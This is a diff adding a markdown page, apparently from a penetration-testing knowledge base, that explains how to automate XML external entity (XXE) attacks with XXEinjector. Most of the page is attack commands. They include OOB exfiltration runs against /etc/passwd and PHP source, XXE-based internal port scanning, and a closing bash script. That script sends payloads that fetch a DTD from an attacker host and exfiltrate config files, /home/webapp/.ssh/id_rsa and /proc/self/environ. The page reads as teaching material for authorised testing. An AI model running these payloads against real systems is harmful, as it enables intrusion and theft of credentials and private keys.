@@ -1,0 +1,323 @@
+---
+title: Automation
+description: XXEinjector and similar tools automate the repetitive parts of XXE - file enumeration, blind OOB exfil with auto-hosted DTDs, error-based recovery, directory crawls. Request-file format, the basic/oob/phpfilter modes, output handling, and when to script your own bash chain instead.
+mitre: [T1190, T1083]
+d3fend: [D3-IAA]
+impact: [DataExfil, FileRead]
+owasp: [A05]
+sidebar:
+  order: 6
+  label: Automation
+---
+
+## TL;DR
+
+For repeated file reads, blind exfil chains, or systematic exploitation of a confirmed XXE, [XXEinjector](https://github.com/enjoiz/XXEinjector) automates the moving parts: hosting the DTD, running the OOB listener, encoding the file paths, decoding the results.
+
+```
+# 1. Capture the vulnerable request in Burp; save with XXEINJECT placeholder
+cat > /tmp/xxe.req <<'EOF'
+POST /blind/submitDetails.php HTTP/1.1
+Host: target
+Content-Type: text/plain;charset=UTF-8
+
+XXEINJECT
+EOF
+
+# 2. Run XXEinjector with the desired path and mode
+ruby XXEinjector.rb \
+     --host=10.10.14.5 --httpport=8000 \
+     --file=/tmp/xxe.req \
+     --path=/etc/passwd \
+     --oob=http --phpfilter
+
+# 3. Output appears under Logs/<host>/
+cat Logs/target/etc/passwd.log
+```
+
+Success indicator: the file appears under `Logs/<target>/<filepath>.log` ready for inspection.
+
+## When to use XXEinjector
+
+| Scenario | Tool choice |
+| --- | --- |
+| One-off file read on a reflected XXE | Manual curl - faster than tooling setup |
+| Reading a few specific files via reflected XXE | Manual Burp Repeater |
+| Blind XXE that needs CDATA/error/OOB chain | XXEinjector - automates the DTD hosting |
+| Many files to extract | XXEinjector with `--enumports` or `--brute` flags |
+| Custom protocol probes (UNC, gopher) | Manual - XXEinjector is HTTP/file focused |
+| Probing internal hosts (SSRF) | Manual or burp-driven; XXEinjector has limited SSRF support |
+
+For most engagements, the manual flow from [File disclosure](/codex/web/xxe/file-disclosure/) and [Blind exfil](/codex/web/xxe/blind-exfil/) covers everything. Automation pays off when the same chain repeats many times.
+
+## XXEinjector setup
+
+```shell
+$ git clone https://github.com/enjoiz/XXEinjector.git
+$ cd XXEinjector
+$ ruby --version    # needs Ruby 2.5+
+ruby 3.0.2p107
+```
+
+No installation step; it's a single Ruby script. Dependencies: `nokogiri` for some parsing, but the basic file-read flow doesn't need it.
+
+```shell
+$ ruby XXEinjector.rb --help
+```
+
+## The request file format
+
+XXEinjector takes a captured HTTP request as input. Capture from Burp:
+
+1. In Burp Proxy → HTTP history, find the XXE-vulnerable request
+2. Right-click → Copy to file → save as `/tmp/xxe.req`
+3. Edit to replace the entire XML body with the single word `XXEINJECT`
+
+The result looks like:
+
+```http
+POST /blind/submitDetails.php HTTP/1.1
+Host: 10.10.10.42
+User-Agent: Mozilla/5.0
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 9
+Connection: close
+
+XXEINJECT
+```
+
+XXEinjector substitutes `XXEINJECT` with its generated XML payload. `Content-Length` is recalculated automatically.
+
+### Headers worth preserving
+
+| Header | Why |
+| --- | --- |
+| `Cookie:` | Session-bound XXE - the parser needs your session to reach the vulnerable endpoint |
+| `Content-Type:` | Must match what the endpoint expects (`text/plain`, `application/xml`, `text/xml`) |
+| `Authorization:` | Bearer-token-protected APIs |
+| `X-CSRF-Token:` | When CSRF protection is in place (note: this rotates per session, so single-shot only) |
+| `Referer:` | Sometimes required for the endpoint to process the request |
+
+If the session expires during a long enumeration run, XXEinjector won't know - it'll keep sending requests that return errors. Restart with a fresh cookie.
+
+## Operation modes
+
+XXEinjector has several modes for different blind-XXE scenarios:
+
+### Basic mode - reflected XXE
+
+```shell
+$ ruby XXEinjector.rb \
+       --file=/tmp/xxe.req \
+       --path=/etc/passwd
+```
+
+For when the response reflects entity content. XXEinjector substitutes the XML, parses the response, extracts the file content from the reflected location.
+
+### OOB mode - `--oob=http`
+
+```shell
+$ ruby XXEinjector.rb \
+       --host=10.10.14.5 --httpport=8000 \
+       --file=/tmp/xxe.req \
+       --path=/etc/passwd \
+       --oob=http
+```
+
+What it does:
+
+1. Hosts a generated DTD on `--host:--httpport` (it runs an embedded HTTP server)
+2. Sends the request with `XXEINJECT` replaced by an XML payload referencing the hosted DTD
+3. The target's parser fetches the DTD, then makes an HTTP callback to XXEinjector with the file content
+4. XXEinjector logs the content under `Logs/<host>/<filepath>.log`
+
+The `--host` argument is your VPN/listener IP - the address the target can reach you on.
+
+### PHP filter mode - `--phpfilter`
+
+```shell
+$ ruby XXEinjector.rb \
+       --host=10.10.14.5 --httpport=8000 \
+       --file=/tmp/xxe.req \
+       --path=/var/www/html/index.php \
+       --oob=http --phpfilter
+```
+
+Wraps the file path in `php://filter/convert.base64-encode/resource=` automatically. The exfiltrated content is base64-encoded, which XXEinjector then decodes on its end before writing the log.
+
+For PHP source-code extraction this is the default - non-base64 source code breaks the XML in the OOB callback URL.
+
+### Port-enumeration mode - `--enumports`
+
+```shell
+$ ruby XXEinjector.rb \
+       --host=10.10.14.5 --httpport=8000 \
+       --file=/tmp/xxe.req \
+       --enumports=21,22,80,443,3306,5432,6379,8080,8443,9000,11211 \
+       --oob=http
+```
+
+Scans the listed ports via XXE-SSRF. The OOB callback content per port indicates open/closed. Slower than a normal nmap but works from the target's network position.
+
+For real engagement use this when you want internal-network port discovery without other footholds. With a foothold you have better options.
+
+### Direct upload mode - `--upload`
+
+For XXE targets where the input vector is a file upload (SVG, DOCX, etc.) rather than a form POST:
+
+```shell
+$ ruby XXEinjector.rb \
+       --host=10.10.14.5 --httpport=8000 \
+       --upload=/tmp/payload.svg \
+       --path=/etc/passwd \
+       --oob=http
+```
+
+`--upload` specifies a template file (e.g., a valid SVG with `XXEINJECT` in place of the payload). XXEinjector substitutes and POSTs the file to the upload endpoint defined in the request file.
+
+## Output handling
+
+All exfiltrated data goes to `Logs/<host>/<filepath>.log`:
+
+```
+$ ls Logs/10.10.10.42/etc/
+hostname.log
+passwd.log
+
+$ cat Logs/10.10.10.42/etc/passwd.log
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+```
+
+When using `--phpfilter`, the log is the *decoded* file content - no manual base64 step needed.
+
+For binary files (the rare case where XXE returns binary), check `Logs/<host>/<filepath>.raw` for the raw bytes vs `.log` for the decoded text.
+
+## Common failure modes
+
+### `Error: Cannot find injection point`
+
+XXEinjector couldn't find `XXEINJECT` in the request file. Check:
+
+- The placeholder is literal `XXEINJECT` (not `<XXEINJECT>` or anything else)
+- The placeholder appears in the body, not in a header
+- The body isn't being parsed as multipart (XXEinjector won't substitute inside multipart parts cleanly)
+
+### `Error: OOB callback never received`
+
+The OOB chain isn't reaching your listener. Diagnose:
+
+```shell
+# Run a raw HTTP listener on the same port
+$ nc -nlvp 8000
+
+# Trigger the XXE manually with an obvious payload
+$ curl -X POST http://target/blind/submitDetails.php \
+       -H 'Content-Type: text/plain;charset=UTF-8' \
+       --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR-IP:8000/test">]><root>&xxe;</root>'
+```
+
+If `GET /test` arrives on nc, the OOB channel works - XXEinjector should work too. If not, the target's parser isn't reaching you (network issue or parser disables external entities).
+
+### `Error: Logs directory not writable`
+
+Run XXEinjector with write access to the working directory, or use `--logger` to specify an alternate output path.
+
+### Empty `.log` file
+
+The OOB callback arrived but contained no usable file content. Possible causes:
+
+- File doesn't exist on the target (path typo)
+- File exists but is permission-restricted (PHP-FPM user can't read `/etc/shadow`)
+- Output too large; OOB URL was truncated by the target's URL parser
+- `--phpfilter` is set but the target isn't PHP
+
+Cross-reference with the manual flow from [Blind exfil](/codex/web/xxe/blind-exfil/) to verify the chain works at all.
+
+## When to script your own
+
+XXEinjector covers the common cases but has limits:
+
+| Need | Tool |
+| --- | --- |
+| Multi-step exfil (read directory, then each file) | Custom bash loop |
+| Per-file post-processing | Custom Python |
+| Mixing XXE with other vulns (auth chain → XXE) | Burp + custom script |
+| Reading thousands of files | Custom - XXEinjector is single-threaded and slow at scale |
+| WAF evasion (custom payload encoding) | Manual / Burp |
+
+A minimal custom script template:
+
+```bash
+#!/bin/bash
+# Mass file extraction via XXE OOB
+
+FILES=(
+  /etc/passwd
+  /etc/hosts
+  /var/www/html/index.php
+  /var/www/html/config.php
+  /home/webapp/.ssh/id_rsa
+  /proc/self/environ
+)
+
+# Listener should already be running on $LISTEN
+LISTEN='http://10.10.14.5:8000'
+
+# Host the DTD template
+cat > /tmp/xxe.dtd <<'EOF'
+<!ENTITY % file SYSTEM "FILE_PLACEHOLDER">
+<!ENTITY % oob "<!ENTITY exfil SYSTEM 'OOB_PLACEHOLDER'>">
+%oob;
+EOF
+
+for f in "${FILES[@]}"; do
+    # Build per-file DTD
+    enc_path=$(printf '%s' "$f" | sed 's|/|\\/|g')
+    sed -e "s|FILE_PLACEHOLDER|php://filter/convert.base64-encode/resource=$f|" \
+        -e "s|OOB_PLACEHOLDER|$LISTEN/?c=%file;\&path=$(echo -n "$f" | base64 -w0)|" \
+        /tmp/xxe.dtd > /tmp/current.dtd
+
+    # Fire the XXE
+    curl -s -X POST http://target/blind/submitDetails.php \
+         -H 'Content-Type: text/plain;charset=UTF-8' \
+         --data "<?xml version='1.0'?>
+<!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://attacker:8000/current.dtd'>%remote;]>
+<root>&exfil;</root>"
+
+    sleep 1     # let the OOB callback arrive
+done
+```
+
+Pair with a PHP receiver that decodes and writes to a per-file log (see [Blind exfil](/codex/web/xxe/blind-exfil/) for the receiver template).
+
+## Other tools
+
+| Tool | Notes |
+| --- | --- |
+| [XXEinjector](https://github.com/enjoiz/XXEinjector) | The canonical XXE automation tool covered above |
+| Burp Pro's "XXE" scanner | Built into Burp Pro; finds reflected XXE but misses blind cases |
+| OWASP ZAP active scan | Similar coverage to Burp |
+| [docem](https://github.com/whitel1st/docem) | Generates XXE-laden Office documents for upload-based XXE |
+| [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) | Same niche, focused on OOXML / ODF docs |
+
+For most non-document-format XXE, XXEinjector handles the automation needs. For document-format XXE (SVG, DOCX, XLSX uploads), the docem / oxml_xxe family is purpose-built.
+
+## Quick reference
+
+| Task | Command |
+| --- | --- |
+| Clone XXEinjector | `git clone https://github.com/enjoiz/XXEinjector.git` |
+| Capture request to file | Burp → Copy to file; replace body with `XXEINJECT` |
+| Basic reflected mode | `ruby XXEinjector.rb --file=req --path=/etc/passwd` |
+| OOB HTTP mode | `--host=YOUR-IP --httpport=8000 --oob=http` |
+| OOB + base64 (PHP source) | `--oob=http --phpfilter` |
+| Port scan mode | `--enumports=21,22,80,...` |
+| Upload-based XXE | `--upload=template.svg` |
+| Output location | `Logs/<target>/<path>.log` |
+| Test OOB connectivity | Manual XXE + `nc -nlvp 8000` |
+| Generate Office XXE payload | `docem` or `oxml_xxe` |
+| Custom-script multiple files | Bash for-loop + DTD-template substitution |
+
+For the end-to-end engagement chain that combines XXE with the IDOR and verb-tampering primitives from earlier in this round, see [Skill assessment chain](/codex/web/xxe/skill-assessment-chain/).
